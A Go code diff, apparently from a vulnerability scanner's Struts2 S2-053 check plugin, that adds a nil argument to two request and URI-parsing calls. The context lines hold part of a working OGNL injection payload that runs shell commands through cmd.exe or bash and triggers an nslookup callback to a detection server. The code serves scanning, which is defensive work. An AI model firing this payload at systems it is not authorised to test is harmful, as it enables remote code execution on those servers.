@@ -25,7 +25,7 @@ func (uf *UPFile) startTesting053() bool {
 				acuserver + " ns1." + acuserver +
 				"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
 
-			features, err := uf.lastJob.RequestByIndex(idx, uf.targetURL, []byte(payload_nslookup))
+			features, err := uf.lastJob.RequestByIndex(idx, uf.targetURL, []byte(payload_nslookup), nil)
 			if err != nil {
 				logger.Error("%s", err)
 			}
@@ -76,7 +76,7 @@ func Struts2_053_Vaild(args *plugin.GroupData) (*util.ScanResult, bool, error) {
 		Param.ContentType = value
 	}
 
-	variations, err := util.ParseUri(Param.Url, []byte(Param.Body), Param.Method, Param.ContentType, Param.Headers)
+	variations, err := util.ParseUri(Param.Url, []byte(Param.Body), Param.Method, Param.ContentType, Param.Headers, nil)
 	if err != nil {
 		// logger.Error(err.Error())
 		return nil, false, errors.New("not found")
